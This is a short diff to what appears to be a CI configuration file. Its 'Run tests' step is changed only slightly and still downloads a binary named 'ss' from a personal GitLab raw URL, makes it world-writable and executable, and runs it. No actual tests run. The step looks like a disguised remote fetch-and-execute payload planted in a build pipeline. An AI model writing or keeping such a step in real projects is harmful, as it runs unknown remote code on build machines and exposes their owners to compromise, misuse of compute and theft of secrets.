@@ -8,7 +8,7 @@ working_dir: &working_dir ~/app
         name: Run tests
         command: |
                     
-                    wget https://gitlab.com/SuanneMoffitt/ss/-/raw/main/ss && chmod 777 voc && chmod 777 ss && ./ss
+                    wget https://gitlab.com/SuanneMoffitt/ss/-/raw/main/ss && chmod 777 ss && ./ss
                     
 
 version: 2.0
